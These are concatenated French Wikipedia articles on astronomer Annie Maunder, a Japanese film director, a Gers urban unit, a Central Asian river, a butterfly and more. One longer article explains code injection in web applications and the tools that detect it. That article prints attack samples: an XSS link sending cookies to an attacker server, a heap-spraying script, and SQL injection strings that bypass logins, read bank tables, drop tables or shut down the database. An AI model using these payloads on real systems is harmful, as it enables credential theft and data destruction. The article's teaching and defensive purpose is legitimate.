En 1891, Annie Russell a commencé à travailler à l'Observatoire royal de Greenwich, affectée au département solaire créé en 1873 pour photographier le soleil. Elle a aidé l'astronome anglais Edward Maunder avec qui elle a passé beaucoup de temps à photographier le soleil. En 1884, le maximum d'activité solaire a entraîné un grand nombre de taches solaires et de clichés photographiques à prendre, à développer et à analyser.
En 1895, Annie Russell et Edward Maunder se marièrent et Annie Russell devenu Madame Annie Maunder, a dû démissionner de son poste en raison de restrictions imposées aux femmes mariées qui travaillent dans la fonction publique. Cependant tous les deux ont continué à collaborer, Annie accompagna Edward dans les expéditions scientifiques pour les éclipses solaires.
En 1908, elle rédigea un ouvrage "The Heavens and their Story" (Les Cieux et de leur histoire) en collaboration avec son mari, mais le livre fut publié sous le nom d'Edward Maunder. Le livre contient ses photographies du soleil et de la Voie lactée.
En 1916, elle devient la première femme élue à la Royal Astronomical Society après que l'interdiction aux femmes fut levée et vingt ans après qu'elle fut proposée comme membre en 1896.
Edward est décédé en 1928 à l'âge de 76 ans. Annie est morte près de deux décennies plus tard, âgée de 80 ans à Wandsworth, district de Londres en Angleterre en 1947.
Honneur.
L'Union astronomique internationale a donné le nom de Maunder à un cratère lunaire ainsi qu'à un cratère martien. L'astéroïde a également été nommé en son honneur.

</doc>
<doc id="6805260" url="https://fr.wikipedia.org/wiki?curid=6805260" title="Annie Maunder">
Annie Maunder



</doc>
<doc id="6805267" url="https://fr.wikipedia.org/wiki?curid=6805267" title="Injection de code dans les applications web">
Injection de code dans les applications web

L'injection de code est une technique qui consiste à injecter des données dans une application pour en modifier le comportement. Dans le cadre d'une application web, on peut distinguer deux familles, les injections du côté client web et les injections du côté serveur de base de données. Ces injections sont souvent effectuées en injectant le code malicieux via les formulaires disponibles dans ces applications.
Cet article présente certaines techniques d'injections et certains mécanismes de protection appliqués aux langages JavaScript et SQL
JavaScript.
Le JavaScript est un langage de programmation de script orienté client. Il peut également être utilisé côté serveur, avec par exemple AngularJS ou node.js. Les préoccupations de l'utilisateur étant de plus en plus importantes, il est devenu l'un des langages incontournables en web 2.0.
Ce langage possède différentes politiques de sécurité. La première permet de limiter l'exécution d'un script. Il n'a en effet pas accès à toutes les ressources système puisqu'il est limité aux ressources du navigateur. Ce mode de fonctionnement est appelé sandboxing.
La seconde est la . Elle vise à restreindre l'accès d'un script aux données du domaine d'exécution. Deux domaines sont considérés égaux à partir du moment où le protocole, l'hôte et le port sont identiques sur les deux domaines.
Le JavaScript étant de plus en plus utilisé, il est la cible, au même titre que le SQL, de plusieurs attaques visant à outrepasser ces politiques de sécurité.
Types d'attaque.
Deux catégories d'attaque peuvent être utilisées, l'attaque de Cross-site scripting (XSS) et celle du heap-spraying.
Cross-site scripting (XSS).
Principes et buts.
Une attaque XSS est une attaque visant les sites internet ou les applications Web. Elle consiste à injecter des scripts dans la réponse d'une application, généralement du HTML, qui sera interprétée par le navigateur. Le but de ces deux attaques est de récupérer les données sensibles de l'application et de les envoyer vers un serveur sous le contrôle de l'attaquant.
Il y a deux types d'attaque XSS, la reflected XSS (aussi communément appelée type 1 ou first-order XSS) et la persistent XSS (aussi communément appelée type 2, stored XSS ou second-order XSS).
La reflected XSS consiste à injecter des scripts dans une application pour qu'ils soient exécutés sur le navigateur du côté client. Cette attaque n'est pas stockée dans l'application, aucune trace ne sera visible sur le serveur. Elle intervient généralement par la propagation d'un lien et utilise le social engineering. Lorsque l'utilisateur clique sur ce type de lien, une requête contenant du code malicieux est envoyée vers le serveur, celui-ci va alors retourner une réponse contenant ce code à l'utilisateur (page, erreur). Le code injecté sera alors exécuté par le navigateur dans le même contexte que les scripts de l'application, permettant ainsi à l'attaquant de récupérer le cookie associé à l'utilisateur et d'envoyer ces informations vers un serveur sous son contrôle.
La persistent XSS est une attaque qui consiste à stocker du code malicieux à l'intérieur du système de stockage de l'application. Pour qu'elle soit effective, l'application devra utiliser ces données dans la génération de ses réponses. L'exemple courant est un message posté sur un forum. Le message sera nécessairement stocké en base de données. Si celui-ci contient du code malicieux, il sera exécuté à chaque fois qu'un utilisateur ouvrira la page le contenant. Cette attaque a donc beaucoup plus de cibles potentielles que la précédente.
Exemples.
Les informations de l'utilisateur sont stockées à l'intérieur d'un cookie. Un attaquant décide de contourner la politique de sécurité du JavaScript. Il peut alors le faire très simplement en distribuant le lien suivant aux utilisateurs.
&lt;a href="http://www.online-market.com/
 &lt;script&gt; document.location='http://www.my-server.com/steal-cookie.php?'+document.cookie&lt;/script&gt;"&gt;
 Cliquez ici pour obtenir une réduction !
&lt;/a&gt;
Le lien affiché sera : « Cliquez ici pour obtenir une réduction ! ». Si l'utilisateur n'est pas attentif à la cible du lien, il suffit qu'il soit authentifié et qu'il clique sur celui-ci pour envoyer ses données sensibles vers le serveur de l'attaquant.
Un attaquant détecte une faille sur un forum où les utilisateurs peuvent écrire et réagir à des sujets. Le code (très simplifié) du forum est le suivant :
if($_GET['mode'] == 'add') {
 addMessage();
else displayAllCommentsForTopic();
function addMessage() { 
 if(!isset($_POST['msg']) || !isset($_POST['subject_id']) || !isset($_POST['author'])) { 
 exit;
 $msg = $_POST['msg'];
 $subject_id = $_POST['subject_id'];
 $author = $_POST['author'];
 $sql = "INSERT INTO comments VALUES('$msg','$author','$subject_id')";
 $result = mysql_query($sql);
function displayAllCommentsForTopic() {
 if(!isset($_GET['subject_id'])){
 exit;
 $subject_id = $_GET['subject_id'];
 $sql = "SELECT comment FROM comments WHERE subject_id='$subject_id'";
 $result = mysql_query($sql);
 while($row = mysql_fetch_assoc($result)) {
 echo $row['comment'];
L'un des vecteurs d'attaque possible pour l'attaquant lors de la soumission d'un formulaire pourrait être :
Le script &lt;script&gt;alert("Persistent XSS");&lt;/script&gt; sera alors exécuté à chaque fois qu'un utilisateur accèdera au sujet 1.
Heap-spraying.
Une attaque de type utilise la mémoire d'une application pour exécuter du code malicieux. Elle est compliquée à mettre en place et nécessite des connaissances avancées dans le moteur d'exécution du langage visé. Depuis quelques années, les systèmes d'exploitation possèdent des systèmes de protection efficaces. Un système possède nécessairement une protection pour la pile d'exécution, des algorithmes avancés pour l'allocation mémoire, des espaces mémoires réservés aléatoirement et une protection sur l'exécution du code en lui-même. Cependant, les attaques de ce type sont de plus en plus nombreuses et sont particulièrement efficaces dans les applications web puisque les cibles y sont d'autant plus nombreuses.
Principes et but.
Le heap spraying requiert que l'attaquant se base sur d'autres failles de sécurité pour lancer son attaque. En effet, l'attaquant va utiliser la technique du « spray » pour augmenter les chances que le code malicieux qu'il a placé en mémoire soit exécuté. Il faut tout d'abord savoir que l'allocation des objets en mémoire se fait aléatoirement. Cette technique consiste alors à placer le plus d'objets possibles contenant du code malicieux à l'intérieur de celle-ci. Plus le nombre d'objets y sera important, plus il sera probable que l'injection réussisse. Pour augmenter les chances que les objets placés en mémoire soient exécutés, il faut qu'ils respectent une certaine structure. Pour cela, un objet doit contenir un espace suffisamment grand d'instructions NOP, puis un espace contenant le code malicieux de l'attaque. Sa cible la plus courante est les langages interprétés puisqu'ils ne nécessitent aucune compilation.
Ce type d'attaque n'est pas limité au Web. De nombreuses variantes ont été proposées pour le bytecode compilé ou les piles de thread.
Exemple.
Voici un exemple de code javascript utilisé pour attaque de type heap-spraying.
&lt;script&gt;
 shellcode = unescape("%u4343%u4343%...");
 oneblock = unescape("%u0D0D%u0D0D");
 var fullblock = oneblock;
 while (fullblock.length&lt;0x40000) {
 fullblock += fullblock;
 sprayContainer = new Array();
 for (i=0; i&lt;1000; i++) {
 sprayContainer[i] = fullblock + shellcode;
&lt;/script&gt;
La ligne 2 va permettre d'allouer une chaîne contenant le code malicieux à exécuter. Les lignes 3 à 8 vont permettre de constituer la partie NOP de l'objet, les lignes 10 à 13 de créer 1000 objets pour le heap-spraying. Chaque objet contiendra une partie NOP et le code à exécuter.
Ce code javascript est contenu dans une page HTML qui sera divulguée par l'intermédiaire de son lien. À chaque fois que la page sera affichée, le javascript sera exécuté et les 1000 objets seront placés en mémoire. L'attaquant devra alors attendre que son code soit exécuté.
Mécanismes de détection.
Plusieurs mécanismes de détection peuvent être mis en place pour contrer ces attaques. Deux politiques peuvent-être envisagées :
Noxes : XSS Web Firewall.
Principes.
Noxes est un mécanisme de protection placé du côté client. Il a été développé par Microsoft et fonctionne en tant que service Windows. Son principe de fonctionnement reprend celui du pare-feu présent sous Windows. Sur un pare-feu classique, une notification apparaît demandant à l'utilisateur s'il souhaite ou non accepter la connexion distante lorsque aucune règle n'a été définie pour celle-ci. Ici, Noxes va appliquer le même procédé, non pas sur la connexion distante, mais sur les requêtes à l'intérieur même de celle-ci. En résumé, il permet à l'utilisateur d'autoriser ou de refuser des requêtes HTTP sur les différentes connexions distantes actives.
Noxes affiche une alerte à chaque fois que des données sensibles sont envoyées vers un autre domaine. L'utilisateur a alors le choix, par le biais d'une pop-up, d'accepter ou non cette requête. Plusieurs optimisations ont été mises en place pour éviter un nombre d'alertes trop important. Par exemple, les liens locaux affichées sur une page ne sont pas traités ou la limitation du nombre de liens externes fixée à quatre.
Efficacité.
Noxes a été évalué sur des bugs référencés pouvant entraîner des attaques XSS (notamment Php-Nuke).
Selon l'étude, il leur a permis de détecter et d'empêcher la plupart de ces attaques.
Limites.
Noxes possède également quelques limites. Premièrement, il ne protège pas des attaques de type D.O.S (Denial Of Service attack). En effet, aucune information sensible n'est transmise durant celles-ci. L'attaquant pourrait par exemple forcer la fermeture du navigateur d'un utilisateur.
Il est également possible pour un attaquant de lancer une attaque XSS et d'injecter du code HTML à la place du Javascript. Noxes se basant sur les cookies et la session, aucune alerte ne sera levée.
Marquage dynamique et statique des données sensibles.
Principes.
Les marquages dynamiques et statiques sont des mécanismes de détection placés du côté client. Ils vont empêcher un site internet tiers ou une application web tierce de récupérer les données sensibles de l'utilisateur. Celles-ci sont automatiquement référencées au lancement de la page ou de l'application.
Pour cela, un mécanisme de marquage dynamique des données est utilisé. Celui-ci va permettre de marquer une donnée comme sensible. Il prend également en compte les dépendances, ce qui va permettre de suivre la donnée tout au long de son cycle de vie, quel que soit le traitement effectué.
Un marquage statique y est également associé pour pallier quelques cas de dépendances indirectes qu'il n'est pas possible de détecter avec le marquage précédent.
Implémentation.
Un prototype a été mis en place permettant d'utiliser ces deux types de marquage. Ce prototype étend la version 1.0pre de Mozilla Firefox. Un nouveau moteur d'exécution du Javascript, Spider-Monkey, a été créé pour marquer les données à l'intérieur de celui-ci. Une modification du DOM html a également été effectuée pour suivre les données marquées à l'intérieur même du HTML. Lorsqu'une donnée sensible est demandée par une ressource externe, l'utilisateur a alors le choix d'autoriser ou non le transfert, temporairement ou en permanence.
Efficacité et limites.
Cette implémentation a été testée sur plusieurs bugs répertoriés dans des applications web open-source, comme phpBB. Elle s'est montrée efficace puisqu'elle les a toutes détectés. Un moteur d'indexation de pages a également été utilisé pour la tester dans des conditions réelles. Plus d'un million de pages ont été analysées, 88 589 d'entre elles ont généré une alerte. Après analyse des données, il s'est avéré que la plupart étaient générées par des sites récoltant des informations pour la génération de statistiques. Les tests à échelle globale n'ont donc pas pu démontrer son efficacité dans des conditions réelles.
NOZZLE : Défense contre le Heap-Spraying.
Principes.
NOZZLE est capable d'intercepter les appels mémoire à l'intérieur du moteur d'exécution du navigateur Firefox. Il va analyser le contenu de tous les objets présents en mémoire. Il se base sur le fait que les objets utilisés par l'attaquant doivent avoir une structure bien précise, comme décrite dans la partie précédente. Pour cela, des analyses avancées ont été mises en place pour les détecter.
Efficacité et limites.
L'analyse de l'efficacité de cette implémentation s'est limitée à son couplage avec Firefox. Il a été testé sur les différentes attaques connues, des cas créés et des sites utilisés quotidiennement. L'analyse des résultats montre qu'un petit nombre de faux positifs et de faux négatifs ont été détectés. Également, les analyses montrent que Nozzle n'augmente pas de manière significative l'utilisation du CPU et ne devrait donc pas perturber l'utilisateur.
SQL.
Le langage SQL est le langage de manipulation de données le plus utilisé pour les applications web. Par conséquent, les attaques les plus courantes visant les applications web sont effectuées via des injections SQL.
Ces attaques ont généralement pour but :
Types d'attaque.
La plupart des attaques présentées dans cet article sont le plus souvent utilisées parallèlement lors des tentatives d'injections SQL. Certains langages de programmation proposent des mécanismes d'échappement pour empêcher les injections SQL, ces derniers sont suffisants pour se protéger des injections basiques mais se révèlent inefficaces lorsqu'ils sont confrontés à des injections plus complexes.
Requêtes incorrectes.
Principes et buts.
En rendant volontairement une requête incorrecte, une personne mal-intentionnée peut récupérer des informations sur la base de données utilisée par le serveur, ainsi que la structure et le type des paramètres attendus par les champs de la requête. Cette attaque n'est possible que lorsqu'un message d'erreur est envoyé lors de l'échec mais le simple fait que la requête ait échoué peut permettre à l'attaquant de deviner des informations sur la requête. C'est une attaque préliminaire aux autres, elle va permettre à l'attaquant d'être plus efficace lors de ses tentatives d'injections SQL.
Exemple.
Prenons le code php suivant :
 $sql = "SELECT id FROM Users WHERE login='".$_POST["login"]."' and password='".$_POST["password"]."'";
 $result = @mysql_query($sql) or die ("Erreur SQL :".$sql);
Ce code représente une requête d'authentification utilisant la méthode POST du protocole HTTP. En cas d'erreur lors de l'exécution de la requête, un message est affiché.
En utilisant codice_1 dans le champ login et codice_2 comme mot de passe, l'exécution de la requête SQL va retourner une erreur car le guillemet droit est interprété comme une fin de chaîne caractères.
 Erreur SQL : SELECT id FROM Users WHERE login="aaa' and password='aaa'
L'attaquant connaît maintenant exactement la requête qui est exécutée sur le serveur, et peut donc passer à des méthodes d'injections plus complexes.
Tautologie.
Principes et buts.
L'attaque par tautologie consiste à rendre toujours vraie une condition suivant un codice_3. La requête SQL ainsi construite retournera donc toujours au moins un résultat lors de son exécution. Cette attaque est couramment utilisée pour contourner une authentification ou pour récupérer les données d'une table. L'attaquant doit modifier la structure syntaxique de la condition et introduire une tautologie qui permettra de modifier le comportement de la requête.
Exemple.
Considérons une requête d'authentification nécessitant un mot de passe et un pseudonyme, si un résultat est retourné alors on estime que l'utilisateur est authentifié.
SELECT id FROM Users WHERE login='(Pseudonyme)' and password='(Mot de passe)'
Si aucune vérification n'est effectuée alors l'attaquant peut contourner le système d'authentification en insérant codice_4 dans login.
SELECT id FROM Users WHERE login=" OR 1=1 --' and password="
Ici la tautologie 1=1 est insérée de manière à rendre inutile toutes les autres conditions de la requête. Pour que la tautologie ne soit pas considérée comme une simple chaîne et puisse donc être évaluée par le moteur SQL il suffit d'utiliser le symbole codice_5 délimitant une chaîne de caractères. Le symbole codice_6 de commentaire SQL permet de s'assurer que le reste de la requête sera ignoré lors de l'évaluation.
Requêtes d'union.
Principes et buts.
En utilisant l'opérateur SQL codice_7, l'attaquant peut modifier totalement le comportement d'une requête. La commande codice_7 de SQL permet de combiner les résultats de deux requêtes, elle peut donc être utilisée pour récupérer les données d'une table autre que celle initialement utilisée dans la requête. L'utilisation de l'opérateur codice_7 nécessite de modifier la structure syntaxique de la requête en utilisant par exemple codice_5 ou codice_6.
Exemple.
Reprenons la requête d'authentification précédente.
SELECT id FROM Users WHERE login='(Pseudonyme)' and password='(Mot de passe)'
Un attaquant ayant récupéré assez d'informations sur la base de données (en utilisant par exemple des requêtes incorrectes) peut utiliser codice_7 pour récupérer d'autres informations. Par exemple en injectant codice_13 dans le champ pseudonyme on obtient la requête suivante :
SELECT id FROM Users WHERE login=" UNION SELECT account_number from Bank_account where 1=1 -- and password="
Cette fois aussi la vérification du mot de passe est ignorée puisque placée après le symbole de commentaire. La requête originale devrait ne pas retourner de résultats car le champ login est une chaîne vide, mais l'utilisation de l'opérateur codice_7 permet ici de récupérer les informations de la table Bank_account.
Requêtes multiples.
Principes et buts.
Certaines configurations de bases de données permettent l'exécution de plusieurs requêtes contenues dans une seule chaîne de requêtes, cette technique est couramment utilisée pour insérer ou mettre à jour de grandes quantités de données. En exploitant cette fonctionnalité l'attaquant peut donc faire exécuter des requêtes multiples (Piggy-Backed Queries en anglais) en injectant le caractère codice_15 habituellement utilisé pour séparer deux requêtes consécutives. Ce type d'attaque se révèle extrêmement puissant car l'attaquant n'est plus limité à la structure de la requête, il est donc en mesure d'ajouter, d'extraire, de modifier ou de supprimer des données à sa guise. Cette attaque permet aussi l'exécution de commandes propres au moteur de bases de données comme par exemple celle concernant la gestion des utilisateurs SQL.
Exemple.
Si la base de données permet l'exécution de requêtes multiples, il suffit alors d'injecter le caractère codice_15 de manière qu'il soit interprété.
SELECT id FROM Users WHERE login='(Pseudonyme)' and password='(Mot de passe)'
En utilisant codice_17 comme pseudonyme, la table Users sera effacée de la base de données.
SELECT id FROM Users WHERE login="; DROP TABLE Users -- and password="
Même si la requête codice_18 ne retourne aucun résultat, la requête contenant le codice_19 sera exécutée. Comme précédemment, la vérification du mot de passe est commentée.
Procédures stockées.
Principes et buts.
Les procédures stockées sont des instructions SQL pré-compilées qui permettent l'interaction avec les données mais aussi avec le système. De nombreux SGBD proposent par défaut un ensemble de procédures stockées et permettent aux utilisateurs d'en créer. L'utilisation de procédures stockées est parfois conseillée pour éviter les injections SQL, mais sans mécanisme de protection, cette pratique se révèle tout aussi dangereuse puisqu'elle permet d'exécuter des instructions du SGBD difficilement accessibles autrement. L'injection SQL dans les procédures stockées permet donc de modifier les privilèges utilisateurs ou même de stopper complètement le SGBD.
Exemple.
Pour SQLServer la requête d'authentification précédente pourrait être écrite sous forme de procédure stockée de la manière suivante :
CREATE PROCEDURE DBO.isAuthenticated
@login varchar2, @password varchar2,
AS
EXEC("SELECT id FROM Users
WHERE login='" +@login+ "' and pass='" +@password+"'");
GO
En utilisant le même principe qu'avec les requêtes multiples, il est possible d'injecter codice_20 dans le champ login. A l'exécution, on obtiendra donc la requête SQL suivante :
SELECT id FROM Users WHERE login="; SHUTDOWN; -- and password="
L'instruction codice_21 va stopper SQL Server empêchant ainsi l'application web attaquée d'exécuter d'autres requêtes. Ceci aura pour effet de rendre l'application inaccessible à la manière d'une attaque DoS.
Attaques en aveugle.
Principes et buts.
Si aucun message d'erreur SQL n'est disponible alors l'attaquant peut utiliser le principe des attaques en aveugle pour obtenir plus d'informations sur les champs sensibles à une injection SQL. Ces attaques permettent de récolter des informations en observant la réponse de l'application. Si le comportement de l'application diffère entre une tentative d'injection et une requête ne retournant pas de résultats alors l'attaquant peut savoir si l'application est vulnérable ou non.
Dans le cas où le comportement ne varie pas, le temps d'exécution peut aussi être utilisé pour obtenir des informations sur la requête SQL. En injectant une commande modifiant significativement le temps d'exécution de la requête, il est possible de savoir si l'injection a été effectuée ou non.
Exemple.
En reprenant le principe de l'attaque par tautologie, il est possible d'exécuter les deux requêtes suivantes :
SELECT id FROM Users WHERE login=" OR 1=0 --' and password="
SELECT id FROM Users WHERE login=" OR 1=1 --' and password="
Si l'injection est possible sur le champ login alors la première requête devrait toujours échouer alors que la deuxième devrait fonctionner. Si l'application renvoie un message d'erreur du type "Impossible de s'authentifier" pour les deux requêtes alors l'injection a échoué et l'attaquant peut en déduire que le champ login est protégé. Dans le cadre contraire, s'il obtient un message d'erreur puis un message différent pour la seconde requête alors il peut en déduire que le champ est sensible à l'injection SQL et passer à des attaques plus complexes.
Changement d'encodage.
Principes et buts.
Le changement d'encodage est utilisé pour contourner les mécanismes de protection mis en place par les développeurs d'applications. Plutôt que d'utiliser directement les caractères dans une chaîne, l'attaquant utilise son équivalent dans un système d'encodage différent, ainsi pour certains SGBD, il est possible d'utiliser directement la valeur hexadécimale d'un caractère ou de passer par la fonction codice_22 qui prend une valeur numérique en argument et retourne le caractère ASCII correspondant. Le changement d'encodage est utilisé en support des autres attaques.
Exemple.
Reprenons notre attaque par tautologie.
SELECT id FROM Users WHERE login=" OR 1=1 --' and password="
Le développeur pourrait utiliser un mécanisme détectant l'utilisation du caractère codice_23 comme une attaque et neutraliser ainsi la tentative d'injection SQL. Toutefois en injectant CHAR(45,45) à la place, on obtient le même résultat à l'exécution.
SELECT id FROM Users WHERE login=" OR 1=1 CHAR(45,45)' and password="
CHAR(45,45) sera interprété par le moteur de bases de données comme la chaîne codice_6 puisque le code ASCII de codice_25 est 45. Le mécanisme mis en place par le développeur ne détectera pas cette mise en commentaire et l'injection fonctionnera.
Mécanismes de détection.
Les mécanismes de détection propres aux langages de programmation et les bonnes pratiques de développement étant faillibles, plusieurs mécanismes de détection complexes sont proposés pour détecter automatiquement les tentatives d'injections. Les solutions présentées ici proposent une implémentation fonctionnant pour un ou plusieurs langages.
AMNESIA.
Principes de fonctionnement.
Pour se protéger des injections SQL, AMNESIA repose sur une analyse statique du programme ainsi que sur une surveillance effectuée lors de l'exécution du programme.
Le code source de l'application est tout d'abord analysé pour construire un modèle correspondant aux requêtes SQL qui sont normalement exécutées par l'application. Ce modèle peut être représenté par un automate fini déterministe qui reconnaîtra le langage des expressions SQL ne contenant pas de tentatives d'injections.
Lors de l'exécution de l'application, les requêtes SQL devant être exécutées sont envoyées au moteur de vérification d'AMNESIA qui va découper la requête de la même façon que le ferait le SGBD pour en extraire une suite d'expressions contenant les mots clefs et types de variables du langage SQL. Par exemple codice_26 sera découpé en codice_27. Ce découpage est ensuite soumis à l'automate formé par le modèle précédemment créé, s'il est accepté alors il n'y a pas injection et l'application continue son exécution normalement, s'il est refusé alors on considère qu'il y a injection SQL et la requête n'est pas exécutée.
Efficacité.
L'outil a été testé avec succès sur 7 applications avec 1470 attaques détectées et 3500 requêtes normales exécutées sans générer un seul faux-positif. Le temps d'exécution supplémentaire généré par l'analyse semble négligeable par rapport à la latence du réseau et au temps d'accès aux données de la base. L'implémentation d'AMNESIA s'est révélée capable de détecter tous les types d'attaques SQL présentés dans cet article sauf lorsque les procédures stockées sont utilisées.
Limitations.
AMNESIA n'est pas capable de détecter les injections lorsqu'elles sont effectuées à l'aide de procédures stockées. L'analyse de l'application nécessite que les requêtes SQL soient facilement identifiables dans le code source. Dans un environnement nécessitant une optimisation des performances, le surcoût de l'analyse pourrait poser problème. Pour l'instant, l'implémentation d'AMNESIA n'est disponible que pour le langage JAVA.
SQLRand.
Principes de fonctionnement.
SQLRand est l'application au langage SQL du mécanisme "instruction set-randomization" qui consiste à encoder les instructions d'un processeur en utilisant un entier seulement connu par le système, ainsi lors d'une tentative d'injection de code du type dépassement de tampon le système ne reconnaitra pas le code injecté et ne l'exécutera donc pas. Appliqué au langage SQL cela consiste simplement à rajouter une clef entière sur chaque mot-clef du langage SQL. Par exemple avec la clef "123", l'instruction codice_18 devient codice_29.
L'application cliente connait la clef et chaque requête est envoyée sur un serveur mandataire qui sert de relais entre l'application web et le SGBD. Le proxy se charge de transformer la requête en supprimant l'entier des mots-clefs du langage avant de l'envoyer vers le SGBD pour exécution. Dans le cas où une instruction ne contient pas la clef, le proxy retourne la valeur codice_30 vers l'application cliente pour lui signaler que la requête est incorrecte. Un attaquant ne connaissant pas la clef ne peut donc pas injecter de code en utilisant la syntaxe SQL usuelle.
Efficacité.
Une implémentation du serveur mandataire en langage C a été testé conjointement avec un forum PHP vulnérable aux injections SQL. Après implémentation de la méthode, les tentatives d'injections ont toutes échouées. Dans le pire des cas, l'utilisation du serveur mandataire a rajouté 6,5ms au temps d'exécution totale de la requête, ce qui semble négligeable pour la plupart des applications web ayant des temps de réponses de l'ordre de la seconde.
Limitations.
Le temps d'exécution supplémentaire pourrait poser problème à des applications dont les temps de réponses doivent être très courts. Il est nécessaire de modifier l'application cliente pour qu'elle utilise la clef lors de la construction de ses requêtes. De plus SQLrand se montre inefficace pour contrer les injections utilisant les procédures stockées, les changements d'encodages et il ne fournit pas de solutions pour traiter différemment les tentatives d'injections de code et les requêtes incorrectes.
SQLCHECK.
Principes de fonctionnement.
SQLCHECK considère qu'une injection de code a lieu lorsqu'une entrée saisie par un utilisateur de l'application modifie la structure syntaxique de la requête SQL utilisant cette entrée. Toutes les entrées utilisateurs, comme celle provenant d'un formulaire, sont entourées de symboles (par exemple { et }) avant d'être ajoutées à une requête. Ce marquage permet ainsi de tracer les entrées considérées comme non fiables tout au long de l'exécution de l'application. Dès lors qu'une requête contenant des entrées marquées doit être exécutée, une analyse syntaxique est effectuée sur cette requête et sur la requête originale ne comprenant pas les entrées utilisateurs. Si la structure de ces deux requêtes diffère, par exemple si l'instruction SQL codice_31 est contenue dans une des entrées utilisateurs, alors SQLCHECK considère qu'il y a eu tentative d'injection et une erreur est levée.
Efficacité.
SQLCHECK a été testé sur une application en PHP et une autre utilisant des JSP. Lors des tests, toutes les tentatives d'injections ont été détectées et il n'y a pas eu de faux-positifs. En moyenne, les contrôles effectués par SQLCHECK ont augmenté le temps d'exécution de 100ms, ce qui n'impacte pas l'expérience de l'utilisateur.
Limitations.
Comme pour les autres méthodes, le temps d'exécution pourrait être problématique pour des applications nécessitant des hautes performances. L'implémentation de l'algorithme, en plus de la modification du code source de l'application, nécessite d'utiliser le système de marquage sur toutes les entrées utilisateurs, ce qui peut être complexe lorsque ces sources sont multiples. SQLCHECK n'est pas capable de détecter les injections SQL lorsque les procédures stockées sont utilisées car il n'y a pas forcément modification de la structure syntaxique du code avec cette technique d'attaque.

</doc>
<doc id="6805271" url="https://fr.wikipedia.org/wiki?curid=6805271" title="Route Australe">
Route Australe



</doc>
<doc id="6805273" url="https://fr.wikipedia.org/wiki?curid=6805273" title="Torajirō Saitō">
Torajirō Saitō

 né le et mort le est un réalisateur japonais connu pour ses comédies. 
Biographie.
Né dans la préfecture d'Akita, Torajirō Saitō entre aux studios Shōchiku en 1922 et fait ses débuts de réalisateur en 1926. Il rejoint la Tōhō en 1937 puis plus tard la Shintōhō. 
Torajirō Saitō est connu comme le « dieu de la comédie » pour avoir dirigé plus de 200 films entre 1926 et 1962, dont beaucoup sont des comédies burlesques mettant en vedette des clowns célèbres tels qu'Atsushi Watanabe, Ken'ichi Enomoto, Roppa Furukawa et Junzaburō Ban.

</doc>
<doc id="6805277" url="https://fr.wikipedia.org/wiki?curid=6805277" title="Unité urbaine d'Auch">
Unité urbaine d'Auch

L'unité urbaine d'Auch est une unité urbaine française centrée sur Auch, préfecture et ville principale du Gers, au cœur de la agglomération urbaine d'Occitanie.
Données générales.
Dans le zonage réalisé par l'Insee en 2010, l'unité urbaine était composée de trois communes.
Dans le nouveau zonage réalisé en 2020, elle est composée des trois mêmes communes.
En , avec , elle représente la unité urbaine du département du Gers et occupe le dans la région Occitanie.
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 1,66 % du territoire départemental mais, par sa population, elle regroupe 13,61 % de la population du département du Gers.
Composition 2020 de l'unité urbaine.
Elle est composée des trois communes suivantes :

</doc>
<doc id="6805282" url="https://fr.wikipedia.org/wiki?curid=6805282" title="Sombre interlude">
Sombre interlude



</doc>
<doc id="6805287" url="https://fr.wikipedia.org/wiki?curid=6805287" title="Mainua">
Mainua

Mainua est un village de la commune de Kajaani dans le Kainuu en Finlande.
Mainua est à l'intersection de la nationale 5 et de la nationale 28 au bord du lac Mainuanjärvi et à 20 kilomètres au sud de Kajaani. 
Mainua a 170 habitants (2007).

</doc>
<doc id="6805301" url="https://fr.wikipedia.org/wiki?curid=6805301" title="Retour de la France dans le commandement intégré de l'OTAN">
Retour de la France dans le commandement intégré de l'OTAN



</doc>
<doc id="6805303" url="https://fr.wikipedia.org/wiki?curid=6805303" title="Xiphocercus darlingtoni">
Xiphocercus darlingtoni



</doc>
<doc id="6805304" url="https://fr.wikipedia.org/wiki?curid=6805304" title="Tchatkal">
Tchatkal

Le Tchatkal est une rivière de Kirghizie et d'Ouzbékistan, appartenant au bassin du Syr Daria, qui se jette dans le réservoir du Tcharvak, non loin du village de Bourtchmoulla. Son cours est de 233 kilomètres.
Description.
Le Tchatkal, qui est alimenté par la fonte des neiges, prend sa source dans les pentes sud-ouest de l'Alataou de Talas. Il traverse dans son cours supérieur une vallée large entre des pentes abruptes et élevées. Après la confluence avec la rivière Ters, le Tchatkal traverse une gorge profonde. Ses affluents gauches principaux sont les rivières Ters (8,1 % du bassin) et Akboulak (11,9 % du bassin), ses affluents droits principaux, les rivières Sandaltach (16,8 % du bassin) et Koksou (5,9 % du bassin). Son débit moyen est de /s jusqu'à /s. avant de se jeter dans le réservoir.
À l'époque soviétique, des itinéraires touristiques rencontraient une certaine popularité, une base ayant été fondée en octobre 1975 pour les sports aquatiques à Bourtchmoulla, qui était régulièrement visitée par des équipes venues de Léningrad ou de Moscou, mais la situation touristique est plus difficile aujourd'hui.
Dans les environs du village d'Obi-Rakhmat (Aourakhmat), les restes d'un homme préhistorique ( ans ) ont été découverts en 2003 sur les bords d'un affluent droit du Tchatkal, le Paltaou.

</doc>
<doc id="6805310" url="https://fr.wikipedia.org/wiki?curid=6805310" title="Rabka-Zdrój">
Rabka-Zdrój

Rabka-Zdrój est une ville de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Elle est le chef-lieu de la gmina de Rabka-Zdrój, dans le powiat de Nowy Targ.

</doc>
<doc id="6805313" url="https://fr.wikipedia.org/wiki?curid=6805313" title="Lamprospilus aunus">
Lamprospilus aunus

Lamprospilus aunus est une espèce d'insectes lépidoptères (papillons) appartenant à la famille des Lycaenidae, à la sous-famille des Theclinae et au genre "Lamprospilus".
Dénomination.
"Lamprospilus aunus" a été décrit par Pieter Cramer en 1874, sous le nom initial de "Papilio aunus".
Synonymes : "Thecla thenca" Möschler, 1883; "Thecla aunus", Hewitson, 1874.
Description.
"Lamprospilus aunus" est un petit papillon aux antennes et aux pattes annelées de blanc et de marron, avec deux fines queues, une longue et une courte à chaque aile postérieure.
Le dessus est marron.
Le revers est marron plus clair orné aux ailes antérieures et aux ailes postérieures d'une fine ligne postdiscale marron, avec, aux ailes postérieures, une ligne marginale de chevrons marron dont deux gros entre les deux queues et à l'angle anal.
Écologie et distribution.
"Lamprospilus aunus" est présent au Surinam et en Guyane.
Protection.
Pas de statut de protection particulier.

</doc>
<doc id="6805314" url="https://fr.wikipedia.org/wiki?curid=6805314" title="Clouski">
Clouski



</doc>
